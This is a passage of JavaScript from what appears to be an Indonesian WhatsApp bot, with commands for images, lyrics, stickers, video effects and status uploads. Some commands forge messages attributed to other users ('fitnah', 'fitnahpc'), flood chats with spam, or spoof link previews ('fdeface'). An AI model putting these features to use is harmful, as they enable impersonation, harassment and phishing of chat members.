        syaa.relayWAMessage(prep);
        fs.unlinkSync(`./${sender}.jpeg`);
        break;*/
      case "loli":
      case "quotes":
      case "kucing":
      case "anjing":
      case "minato":
      case "kakashi":
      case "boruto":
      case "sarada":
      case "mitsuki":
      case "sasuke":
      case "sakura":
      case "squidward":
      case "spongebob":
      case "sudiro":
      case "itachi":
      case "cecan":
      case "cogan":
      case "memeindo":
      case "polosanmeme":
      case "megumin":
      case "waifu":
      case "patrick":
      case "husbu":
      case "milf":
      case "aesthetic":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
      if (isBanned) return reply(mess.ban)
        sendButMessage(from, `Random Image by @k4t4sh1._`, `press the button below`, [
          {
            buttonId: `/pinterest ${command}`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break
case "bis":
  sendButMessage(from, `Random Image by @k4t4sh1._`, `press the button below`, [
          {
            buttonId: `/pinterest sudiro`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break
      case "caripesan":
        case "smsg":
        if (isBanned) return reply(mess.ban)
        if (!q) return reply("pesannya apa bang?");
        let v = await syaa.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await syaa.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
        case "lirik":
          if (!q) return reply("lagu apa?");
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `*Judul Lagu :* ${teks}\n*Lirik Lagu :* ${res[0].result}`
reply(lirik)
})
break
      case "liri":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        syaa.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
      if (isBanned) return reply(mess.ban)
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
      if (isBanned) return reply(mess.ban)
        if (!q) return reply(`gambar apa?\n${prefix}chara syaa`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await syaa.sendMessage(from, li, image, { quoted: mek });
        break;
      case "pinterest":
      if (isBanned) return reply(mess.ban)
        if (!q) return reply("gambar apa?");
        reply("Sedang mencari ImagenyaðŸ”")
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
        await syaa.sendMessage(from, di, image, { quoted: mek })
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "â‰â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‰\n";
        for (let i of play) {
          store += `\n*ã€Œ _PLAY STORE_ ã€*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\nâ‰â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‰`;
        }
        reply(store);
        break;
      case "on":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        reply(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            reply(bu);
          });
        break;
      case "kontag":
        
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        syaa.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await syaa.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await syaa.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;

      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                syaa.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
      case "take":
      case "colong":
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `Putra`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `@k4t4sh1._`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, syaa, mek, from);
        break;
        
        
      case "stikerwm":
      case "stickerwm":
      case "swm":
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
        case "spamsw":
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					syaa.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
      case "upswteks":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
        if (!q) return reply("Isi teksnya!");
        syaa.sendMessage("status@broadcast", `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
        case "upswlokasi":
          if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    syaa.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case "tospam":
                      if (isBanned) return reply(mess.ban)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await syaa.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await syaa.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await syaa.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
   case "vampire":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${bapakao}&apikey=Ikyy69`)
   break
case "remm":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=hardianto&text=${bapakao}`)
   break
case "lolim":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(7)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx2?apikey=hardianto&nama=${bapakao}`)
   break
case "kaneki":
  if (isBanned) return reply(mess.ban)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   reply(mess.wait)
   bapakao = body.slice(8)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx1?apikey=hardianto&nama=${bapakao}`)
   break
case "gura":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gura?apikey=hardianto&nama=${bapakao}`)
   break
case "neko":
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
   break
case "bajingan":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}bajingan lu teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(10)
   sendStickerFromUrl(from, `https://hardianto-chan.herokuapp.com/api/creator/memegen?bawah=${bapakao}&atas=bajingan&imgurl=https://telegra.ph/file/d608ec3cb57ff6b9ac708.jpg&apikey=hardianto`)
   reply("-")
   break
case "darkjokes":
  case "darkjoke":
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/darkmeme?apikey=hardianto`)
   break
   case "codetxt":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=$${bapakao}&apikey=Ikyy69`)
   break
case "matrix":
  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(8)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${bapakao}&apikey=Ikyy69`)
				break
				case "spiderman":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}spiderman teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(11)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${bapakao}&apikey=Ikyy69`)
				break
				case "express":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(9)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${bapakao}&apikey=Ikyy69`)
				break
				case "dance":
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(7)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${bapakao}&apikey=Ikyy69`)
				break
				case "text3d":
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(8)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${bapakao}&apikey=Ikyy69`)
				break
				case "warrior":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(9)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${bapakao}&apikey=Ikyy69`)
				break
				case 'd':
				case 'del':
				case 'delete':
					syaa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
                    case "upswsticker":
                    if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case "upswaudio":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case "upswvoice":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
      case "upswimage":
        if (isQuotedImage) {
          const swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("Reply gambarnya!");
        }
        break;
      case "upswvideo":
        if (isQuotedVideo) {
          const swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("reply videonya!");
        }
        break;
      case "fdeface":
        if (isBanned) return reply(mess.ban)
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await syaa.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await syaa.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        syaa.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`ã€Œ *PUBLIC-MODE* ã€`);
        break;
      case "self":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
